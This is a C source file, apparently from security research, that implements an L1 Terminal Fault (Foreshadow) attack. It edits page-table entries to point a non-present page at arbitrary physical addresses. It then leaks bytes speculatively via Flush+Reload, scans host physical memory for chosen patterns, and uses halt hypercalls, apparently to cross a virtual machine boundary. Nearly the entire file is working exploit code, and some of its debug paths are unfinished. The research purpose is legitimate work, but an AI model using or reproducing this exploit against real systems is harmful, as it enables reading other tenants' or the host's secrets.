#define _GNU_SOURCE
#include "l1tf.h"
#include "constants.h"
#include "flush_and_reload.h"
#include "helpers.h"
#include "secret.h"
#include "spectre.h"
#include "statistics.h"
#include <asm-generic/errno-base.h>
#include <bits/time.h>
#include <bits/types/siginfo_t.h>
#include <err.h>
#include <errno.h>
#include <getopt.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <time.h>
#include <ucontext.h>
#include <unistd.h>

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-function"
#include "ptedit_header.h"
#pragma GCC diagnostic pop

#include <assert.h>
#include <hypercall.h>

#define THRESHOLD 150

uint8_t l1tf_full(void *leak_addr, reload_buffer_t reload_buffer) {
  ssize_t high, low;

  do {
    flush(AMOUNT_OF_OPTIONS_IN_NIBBLE, (void *)reload_buffer[0]);
    asm_l1tf_leak_high_nibble(leak_addr, reload_buffer);
    high = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, (void *)reload_buffer[0], THRESHOLD);
  } while (high == -1);

  do {
    flush(AMOUNT_OF_OPTIONS_IN_NIBBLE, (void *)reload_buffer[0]);
    asm_l1tf_leak_low_nibble(leak_addr, &reload_buffer[0]);
    low = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, (void *)reload_buffer[0], THRESHOLD);
  } while (low == -1);

  return ((high & 0x0f) << 4) | (low & 0x0f);
}

// Super fast checking of the existance of a byte at a certain address.
// Only requires a single FLUSH+RELOAD of a single address (instead
// of 32 or 256). Useful to quickly scan physical memory, assuming we know
// that a certain byte appears.
bool l1tf_check(void *leak_addr, full_reload_buffer_t reload_buffer, uint8_t check) {
  clflush(reload_buffer[check]);
  mfence();

  asm_l1tf_leak_full(leak_addr, reload_buffer);

  size_t time = access_time(reload_buffer[check]);
  return time < THRESHOLD;
}

bool l1tf_check_2(void *leak_addr, full_reload_buffer_t reload_buffer, uint8_t check[2]) {
  clflush(reload_buffer[check[1]]);
  mfence();

  uint16_t half_word = *(uint16_t *)check;
  asm_l1tf_leak_full_2_byte_mask(leak_addr, reload_buffer, half_word & 0x00ff);

  size_t time = access_time(reload_buffer[check[1]]);
  return time < THRESHOLD;
}

bool l1tf_check_4(void *leak_addr, full_reload_buffer_t reload_buffer, uint8_t check[4]) {
  clflush(reload_buffer[check[3]]);
  mfence();

  uint32_t word = *(uint32_t *)check;
  asm_l1tf_leak_full_4_byte_mask(leak_addr, reload_buffer, word & 0x00ffffff);

  size_t time = access_time(reload_buffer[check[3]]);
  return time < THRESHOLD;
}

leak_addr_t l1tf_leak_buffer_create(void) {
  void *leak_ptr =
      mmap(NULL, PAGE_SIZE, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
  assert(leak_ptr != MAP_FAILED);
  assert(!mprotect(leak_ptr, PAGE_SIZE, PROT_NONE));

  leak_addr_t leak;
  leak.leak = leak_ptr;

  ptedit_entry_t entry = ptedit_resolve(leak.leak, 0);
  leak.pte_ptr = entry.pte_ptr;
  leak.original_pfn = ptedit_get_pfn(*leak.pte_ptr);

  *leak.pte_ptr &= ~(1ull << PTEDIT_PAGE_BIT_PRESENT);
  ptedit_invalidate_tlb(leak.leak);

  return leak;
}

void l1tf_leak_buffer_modify(leak_addr_t *leak, uintptr_t ptr) {
  size_t pfn = (ptr & ~(0xfff)) >> 0xc;
  size_t current_pte = *(leak->pte_ptr);
  *(leak->pte_ptr) = ptedit_set_pfn(current_pte, pfn);
}

void l1tf_leak_buffer_free(leak_addr_t *leak) {
  // Restore leak PFN before munmapping the buffer
  ptedit_pte_set_pfn(leak->leak, 0, leak->original_pfn);
  assert(!munmap(leak->leak, PAGE_SIZE));
}

void initialize_pteditor_lib(void) {
  fprintf(stderr, "Initializing PTEdit...\r");
  assert(!ptedit_init());
  fprintf(stderr, "Initialized PTEdit! Mapping physical memory to user space...\n");
  ptedit_use_implementation(PTEDIT_IMPL_USER);
}

reload_buffer_t *l1tf_reload_buffer_create(void) {
  reload_buffer_t *reload_buffer = mmap(NULL, sizeof(reload_buffer_t), PROT_WRITE | PROT_READ,
                                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
  assert(reload_buffer != MAP_FAILED);
  return reload_buffer;
}

void l1tf_reload_buffer_free(reload_buffer_t *reload_buffer) {
  assert(!munmap(reload_buffer, sizeof(reload_buffer_t)));
}

void l1tf_do_leak(const uintptr_t phys_addr, const size_t length) {
  initialize_pteditor_lib();

  fprintf(stderr, "Attempting to leak %ld bytes from %p...\n", length, (void *)phys_addr);
  fprintf(stderr, "Request leak and reload buffers\n");

  reload_buffer_t *reload_buffer = l1tf_reload_buffer_create();

  leak_addr_t leak = l1tf_leak_buffer_create();
  l1tf_leak_buffer_modify(&leak, phys_addr);

  fprintf(stderr, "Clear the reload buffer at %p\n", (void *)reload_buffer);
  memset(reload_buffer, 0, sizeof(reload_buffer_t));

  const size_t results_size = sizeof(size_t[2 * length][16]);
  size_t(*results)[16] = malloc(results_size);
  memset(results, 0, results_size);

  printf("Continously leaking %ld bytes from physcial address 0x%lx:\n", length, phys_addr);
  size_t start = (phys_addr & 0xfff);
  assert(start + length < 0xfff);

  size_t *assembled_results = malloc(length * sizeof(size_t));
  const int bytes_per_line = 16;

  while (1) {
    for (int x = 0; x < 10; ++x) {
      for (size_t i = 0, j = start; j < start + length; j += 1, i += 2) {
        void *leak_addr = (char *)leak.leak + j;
        size_t high =
            l1tf_do_leak_nibblewise_prober(leak_addr, reload_buffer, asm_l1tf_leak_high_nibble) & 0xf;
        size_t low = l1tf_do_leak_nibblewise_prober(leak_addr, reload_buffer, asm_l1tf_leak_low_nibble) & 0xf;

        // Count the number of times each result has occured
        results[i][high]++;
        results[i + 1][low]++;
      }
    }

    for (size_t i = 0; i < 2 * length; i += 2) {
      size_t high = maximum(15, &results[i][1]) + 1;
      if (results[i][high] < 2) {
        high = 0;
      }

      size_t low = maximum(15, &results[i + 1][1]) + 1;
      if (results[i + 1][low] < 2) {
        low = 0;
      }

      size_t result = ((high & 0x0f) << 4) | (low & 0x0f);
      assembled_results[i / 2] = result;
      printf("%02lx ", result);

      if (i % (2 * bytes_per_line) == ((2 * bytes_per_line) - 2)) {
        // We would like to compare the results to the ground truth, to see the accuracy
        printf("\t");
        size_t line = i / (2 * bytes_per_line);
        for (size_t byte = 0; byte < bytes_per_line; ++byte) {
          size_t idx = byte + (line * bytes_per_line);
          char out[3];
          escape_ascii(assembled_results[idx], out);
          printf("%s", out);
        }

        printf("          ");

        printf("\n\r");
      }
    }

    // Restore cursor position
    printf("\033[%ldA\r", length / bytes_per_line);
  }

  free(assembled_results);
  free(results);

  l1tf_leak_buffer_free(&leak);
  l1tf_reload_buffer_free(reload_buffer);

  ptedit_cleanup();
}

void *l1tf_scan_physical_memory(scan_opts_t scan_opts, size_t needle_size, char needle[needle_size],
                                full_reload_buffer_t reload_buffer, leak_addr_t leak) {
  assert(needle_size > 0);
  assert(needle_size < scan_opts.stride);
  assert(needle_size % 2 == 0);
  assert((scan_opts.start & 0xfff) + needle_size < PAGE_SIZE);

  reload_buffer_t nibble_reload_buffer = {0};
  size_t attempt = 1;

  if (needle_size % 4 == 0) {
    while (true) {
      for (uintptr_t ptr = scan_opts.start, i = 0; ptr < scan_opts.end; ptr += scan_opts.stride, ++i) {
        if (i % 100000 == 0) {
          fprintf(stderr, "run %ld: %.2f%%\r", attempt,
                  ((double)(ptr - scan_opts.start) / (double)(scan_opts.end - scan_opts.start)) *
                      (double)100);
        }
        l1tf_leak_buffer_modify(&leak, ptr);

        for (size_t idx = 0; idx < needle_size; idx += 4) {
          uint8_t *leak_ptr = &((uint8_t *)leak.leak)[idx + (ptr & 0xfff)];
          if (l1tf_check_4(leak_ptr, reload_buffer, (uint8_t *)needle)) {
            uint8_t leaked_data[32] = {0};
            for (size_t data_idx = 0; data_idx < 32; ++data_idx) {
              leaked_data[data_idx] = l1tf_full(&leak_ptr[data_idx], nibble_reload_buffer) & 0xff;
            }
            printf("\n%p\t", (void *)ptr);
            for (size_t leaked_data_idx = 0; leaked_data_idx < 32; ++leaked_data_idx) {
              printf("%.2x ", leaked_data[leaked_data_idx]);
            }
            printf("\n");
            fflush(stdout);
          }
        }
      }
      ++attempt;
    }
  } else if (needle_size % 2 == 0) {
    while (true) {
      for (uintptr_t ptr = scan_opts.start, i = 0; ptr < scan_opts.end; ptr += scan_opts.stride, ++i) {
        if (i % 100000 == 0) {
          fprintf(stderr, "run %ld: %.2f%%\r", attempt,
                  ((double)(ptr - scan_opts.start) / (double)(scan_opts.end - scan_opts.start)) *
                      (double)100);
        }
        l1tf_leak_buffer_modify(&leak, ptr);

        for (size_t idx = 0; idx < needle_size; idx += 2) {
          uint8_t *leak_ptr = &((uint8_t *)leak.leak)[idx + (ptr & 0xfff)];
          if (l1tf_check_2(leak_ptr, reload_buffer, (uint8_t *)needle)) {
            uint8_t leaked_data[32] = {0};
            for (size_t data_idx = 0; data_idx < 32; ++data_idx) {
              leaked_data[data_idx] = l1tf_full(&leak_ptr[data_idx], nibble_reload_buffer) & 0xff;
            }
            // if (leaked_data[6 + idx] == needle[idx] && leaked_data[7 + idx] == needle[idx + 1]) {
            printf("\n%p\t", (void *)ptr);
            for (size_t leaked_data_idx = 0; leaked_data_idx < 32; ++leaked_data_idx) {
              printf("%.2x ", leaked_data[leaked_data_idx]);
            }
            printf("\n");
            fflush(stdout);
            // }
          }
        }
      }
      ++attempt;
    }
  }
  return NULL;
}

size_t l1tf_do_leak_nibblewise_prober(void *leak_addr, reload_buffer_t *reload_buffer,
                                      void (*l1tf_leak_function)(void *, reload_buffer_t)) {
  const size_t nr_of_probes = 25;
  const size_t probe_size = AMOUNT_OF_OPTIONS_IN_NIBBLE * sizeof(size_t);
  size_t *probes = malloc(probe_size);
  memset(probes, 0, probe_size);

  for (size_t probe_nr = 0; probe_nr < nr_of_probes; ++probe_nr) {
    ssize_t nibble = -1;
    size_t attempt = 0;
    do {
      flush(AMOUNT_OF_OPTIONS_IN_NIBBLE, (void *)reload_buffer[0]);
      l1tf_leak_function(leak_addr, reload_buffer[0]);
      nibble = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, (void *)reload_buffer[0], THRESHOLD);
      attempt += 1;
    } while (nibble == -1 && attempt < 250);

    if (nibble != -1) {
      probes[nibble] += 1;
    }
  }

  size_t max = maximum(AMOUNT_OF_OPTIONS_IN_NIBBLE - 1, &probes[1]) + 1;
  if (probes[max] == 0) {
    max = 0;
  }

  free(probes);

  return max;
}

void l1tf_do_leak_nibblewise(const uintptr_t phys_addr, const size_t length) {
  initialize_pteditor_lib();

  fprintf(stderr, "Attempting to leak %ld bytes from %p...\n", length, (void *)phys_addr);
  fprintf(stderr, "Request leak and reload buffers\n");

  reload_buffer_t *reload_buffer = l1tf_reload_buffer_create();

  leak_addr_t leak = l1tf_leak_buffer_create();
  l1tf_leak_buffer_modify(&leak, phys_addr);

  fprintf(stderr, "Clear the reload buffer at %p\n", (void *)reload_buffer);
  memset(reload_buffer, 0, sizeof(reload_buffer_t));

  const size_t results_size = length * sizeof(uint8_t);
  uint8_t *results = malloc(results_size);
  memset(results, 0, results_size);

  printf("Continously leaking %ld bytes from physcial address 0x%lx:\n", length, phys_addr);
  size_t start = (phys_addr & 0xfff);
  assert(start + length < 0xfff);

  for (int iter = 1; iter <= 10000; ++iter) {
    for (size_t i = 0, j = start; j < start + length; j += 1) {
      void *leak_addr = (char *)leak.leak + j;
      size_t high = l1tf_do_leak_nibblewise_prober(leak_addr, reload_buffer, asm_l1tf_leak_high_nibble);
      size_t low = l1tf_do_leak_nibblewise_prober(leak_addr, reload_buffer, asm_l1tf_leak_low_nibble);
      size_t result = ((high & 0x0f) << 4) | (low & 0x0f);
      results[i++] = result;
    }

    for (size_t i = 0; i < length; ++i) {
      printf("%02x ", results[i]);
    }
    printf("\n");
  }

  free(results);

  l1tf_leak_buffer_free(&leak);
  l1tf_reload_buffer_free(reload_buffer);

  ptedit_cleanup();
}

int l1tf_oracle16_ffff(uintptr_t physical_addr, int nr_tries, two_byte_reload_buffer *reload_buffer, leak_addr_t leak) {
  l1tf_leak_buffer_modify(&leak, physical_addr);
  uintptr_t leak_addr = (uintptr_t)leak.leak + (physical_addr & 0xfff);

  int hits = 0;

  for (int i = 0; i < nr_tries; i++) {
    flush(1, (*reload_buffer)[0xffff]);
    asm_l1tf_leak_2_highest_bytes((void *)leak_addr, *reload_buffer);
    ssize_t value = reload(1, (*reload_buffer)[0xffff], THRESHOLD);
    hits += value != -1;
  }

  return hits;
}

int l1tf_oracle16_9797(uintptr_t physical_addr, int nr_tries, two_byte_reload_buffer *reload_buffer, leak_addr_t leak) {
  l1tf_leak_buffer_modify(&leak, physical_addr);
  uintptr_t leak_addr = (uintptr_t)leak.leak + (physical_addr & 0xfff);

  int hits = 0;

  for (int i = 0; i < nr_tries; i++) {
    flush(1, (*reload_buffer)[0x9797]);
    asm_l1tf_leak_2_highest_bytes((void *)leak_addr, *reload_buffer);
    ssize_t value = reload(1, (*reload_buffer)[0x9797], THRESHOLD);
    hits += value != -1;
  }

  return hits;
}

int l1tf_oracle16_9797_touch(uintptr_t physical_addr, int nr_tries, two_byte_reload_buffer *reload_buffer, leak_addr_t leak, void *touch) {
  l1tf_leak_buffer_modify(&leak, physical_addr);
  uintptr_t leak_addr = (uintptr_t)leak.leak + (physical_addr & 0xfff);

  int hits = 0;

  for (int i = 0; i < nr_tries; i++) {
    *(volatile char *)touch;
    lfence();
    flush(1, (*reload_buffer)[0x9797]);
    asm_l1tf_leak_2_highest_bytes((void *)leak_addr, *reload_buffer);
    ssize_t value = reload(1, (*reload_buffer)[0x9797], THRESHOLD);
    hits += value != -1;
  }

  return hits;
}

void l1tf_find_ffff_values(scan_opts_t scan_opts) {
  int fd_halt = open("/proc/hypercall/halt", O_WRONLY);
  assert(fd_halt > 0);

  initialize_pteditor_lib();
  two_byte_reload_buffer *reload_buffer = aligned_alloc(PAGE_SIZE, sizeof(two_byte_reload_buffer));
  memset(reload_buffer, 0, sizeof(two_byte_reload_buffer));
  leak_addr_t leak = l1tf_leak_buffer_create();

  unsigned char *p = l1tf_spawn_leak_page();
  assert(p != MAP_FAILED);
  uintptr_t own_pa  = helper_find_page_pa(p);
  memset(p, 0x97, PAGE_SIZE);

  for (int l1tfs_per_halt = 3000; l1tfs_per_halt < 10000; l1tfs_per_halt += 100) {
    long hot = 0;
    uint64_t t_start = clock_read();
    for (int i = 0; i < 100; i++) {
      for (int r = 0; r < 2; r++)
        assert(write(fd_halt, NULL, 0) == 0);
      hot += l1tf_oracle16_9797_touch(own_pa, l1tfs_per_halt, reload_buffer, leak, p);
    }
    double time = (clock_read() - t_start) / 1000000000.0;
    // printf("[%8.1f hits/sec]  hits = %ld,  time = %.1f sec, l1tfs_per_halt = %d\n", hot / time, hot, time, l1tfs_per_halt);
    printf("[%6d, %10.1f],\n", l1tfs_per_halt, hot/time);
  }

  l1tf_leak_buffer_free(&leak);
  ptedit_cleanup();
  return;
}

// If you already know a physical address that you want to leak
int l1tf_main_leak(const int argc, char *argv[argc], void (*leak_func)(uintptr_t, size_t)) {
  // Parse the physcial address and the length from the
  // command line arguments
  uintptr_t phys_addr = -1;
  size_t length = -1;

  static struct option options[] = {
      {"address", required_argument, 0, 'a'},
      {"length", required_argument, 0, 'l'},
  };

  while (true) {
    int option_idx = 0;
    int choice = getopt_long(argc, argv, "a:l:", options, &option_idx);
    if (choice == -1) {
      break;
    }

    char *tail = NULL;
    switch (choice) {
    case 'a':
      phys_addr = strtoull(optarg, &tail, 16);
      if (tail == optarg) {
        fprintf(stderr, "Failed to parse physical address as hexadecimal\n");
        exit(1);
      }
      break;
    case 'l':
      length = strtoull(optarg, &tail, 10);
      if (tail == optarg) {
        fprintf(stderr, "Failed to parse length\n");
        exit(1);
      }
      break;
    }
  }

  // Make sure that both the phys_addr and length are set
  if (phys_addr == (uintptr_t)-1 || length == (size_t)-1) {
    fprintf(stderr,
            "Required arguments of %s subcommand\n"
            "\t-%c, --%s\thexadecimal physical address where you "
            "want to leak from\n"
            "\t-%c, --%s\tamount of bytes you want to leak\n",
            argv[1], options[0].val, options[0].name, options[1].val, options[1].name);
    exit(1);
  }

  leak_func(phys_addr, length);
  exit(0);
}

void *l1tf_spawn_leak_page(void) {
  FILE *rand_file = NULL;
  const char *leak_page_name = "/l1tf_leak_page";

  int fd = shm_open(leak_page_name, O_RDWR | O_CREAT | O_EXCL, S_IRUSR | S_IWUSR);
  if (fd < 0) {
    // It already exists, so let's reuse it!
    if (errno != EEXIST) {
      err(EXIT_FAILURE, "Failed to open leak shm page");
    }

    fd = shm_open(leak_page_name, O_RDWR, S_IRUSR);
    if (fd < 0) {
      err(EXIT_FAILURE, "Failed to open existing leak shm page");
    }
    printf("Opened existing leak page!\n");
  } else {
    printf("Creating new leak page!\n");
    // Make sure the shared memory region is page in size
    if (ftruncate(fd, PAGE_SIZE) != 0) {
      int e = errno;
      if (shm_unlink(leak_page_name) != 0) {
        err(EXIT_FAILURE, "Failed to unlink %s", leak_page_name);
      };
      errno = e;
      err(EXIT_FAILURE, "Failed to resize shared memory");
    }

    // Open /dev/random
    rand_file = fopen("/dev/random", "r");
    if (rand_file == NULL) {
      int e = errno;
      if (shm_unlink(leak_page_name) != 0) {
        err(EXIT_FAILURE, "Failed to unlink %s", leak_page_name);
      };
      errno = e;
      err(EXIT_FAILURE, "Failed to open /dev/random");
    }
  }

  void *leak_page = NULL;
  if (rand_file != NULL) {
    leak_page = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, fd, 0);
    if (leak_page == (void *)-1) {
      err(EXIT_FAILURE, "mmap of leak page failed");
    }

    // Fill the newly opened page with random data
    if (fread(leak_page, PAGE_SIZE, 1, rand_file) != 1) {
      int e = errno;
      if (shm_unlink(leak_page_name) != 0) {
        err(EXIT_FAILURE, "Failed to unlink %s", leak_page_name);
      };
      errno = e;
      err(EXIT_FAILURE, "Failed to read from /dev/random into leak page");
    };

    if (fclose(rand_file) != 0) {
      err(EXIT_FAILURE, "Failed to close rand_file");
    }
  } else {
    leak_page = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, fd, 0);
    if (leak_page == (void *)-1) {
      err(EXIT_FAILURE, "mmap of leak page failed");
    }
  }
  return leak_page;
}

int l1tf_main(int argc, char *argv[argc]) {
  assert(argc > 0);

  if (argc >= 2) {
    if (!strcmp("leak", argv[1])) {
      return l1tf_main_leak(argc, argv, l1tf_do_leak);
    } else if (!strcmp("leak_repeat", argv[1])) {
      return l1tf_main_leak(argc, argv, l1tf_do_leak_nibblewise);
    }
  }

  char *name = argv[0];
  fprintf(stderr,
          "Usage\n"
          "\t%s leak\n"
          "\t%s leak_repeat\n",
          name, name);
  exit(1);
}

////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////

static __attribute__((aligned(PAGE_SIZE))) two_byte_reload_buffer rbuf16;
static leak_addr_t leak_addr;
static int halt_counter = 1;
static int fd_halt = -1;

static int l1tf_oracle16_touch(void *p, uintptr_t pa, int nr_tries) {
  l1tf_leak_buffer_modify(&leak_addr, pa);
  uint16_t magic = *(uint16_t *)p;

  int hits = 0;
  for (int i = 0; i < nr_tries; i++) {
    if (--halt_counter <= 0) {
      halt_counter = 4500;
      for (int r = 0; r < 2; r++)
        assert(write(fd_halt, NULL, 0) == 0);
    }
    *(volatile char *)p;
    lfence();
    flush(1, rbuf16[magic]);
    asm_l1tf_leak_2_highest_bytes(leak_addr.leak+(pa & 0xfff), rbuf16);
    ssize_t value = reload(1, rbuf16[magic], THRESHOLD);
    hits += value != -1;
  }

  return hits;
}

uintptr_t l1tf_find_page_pa(void *p)
{
  const int verbose = 1;

#if DEBUG
  uintptr_t real_pa = helper_find_page_pa(p);
  if (verbose) printf("l1tf_find_page_pa: the real pa is at %10lx\n", real_pa);
#endif

  uint64_t t_start = clock_read();

  *(uint64_t *)p = rand64();

  int ok = 0;
  int error = 0;

  for (int run = 0; run < 100; run++) {
    uintptr_t start = 0; uintptr_t end = HOST_MEMORY_SIZE;
    // uintptr_t start = real_pa-512*1024*1024; uintptr_t end = real_pa+HUGE_PAGE_SIZE;
    for (uintptr_t pa = start; pa < end; pa += PAGE_SIZE) {
      if (verbose) if (pa % (16*1024*1024) == 0) {
        printf("l1tf_find_page_pa: run %3d  |  pa  %12lx", run, pa);
        fflush(stdout);
        printf("\33[2K\r");
      }

      int off;
      for (off = 0; off < 8; off += 2) {
        char *q = (char *)p + off;
        uintptr_t pa_q = pa + off;
        int hits = l1tf_oracle16_touch(q, pa_q, 10 + off*1000);
        if (!hits)
          break;
        if (verbose) printf("l1tf_find_page_pa: run %3d  | va %14p  |  pa %12lx  |  hits %4d\n", run, q, pa_q, hits);
      }
      if (off == 8) {
        if (verbose) {
          double time = (clock_read()-t_start)/1000000000.0;
          uintptr_t len = (pa-start) + run*(end-start);
          printf("l1tf_find_page_pa: found pa %lx in %.1f sec (%.1f MB/s)\n", pa, time, len/time / (1024*1024));
        }
        if (pa == real_pa)
          ok++;
        else
          error++;
      }
    }
  }

  printf("ok = %d,   error = %d\n", ok, error);

  return -1;
}

void l1tf_init(void)
{
  initialize_pteditor_lib();
  memset(rbuf16, 0x42, sizeof(rbuf16));
  leak_addr = l1tf_leak_buffer_create();
  fd_halt = open("/proc/hypercall/halt", O_WRONLY);
  assert(fd_halt > 0);
}
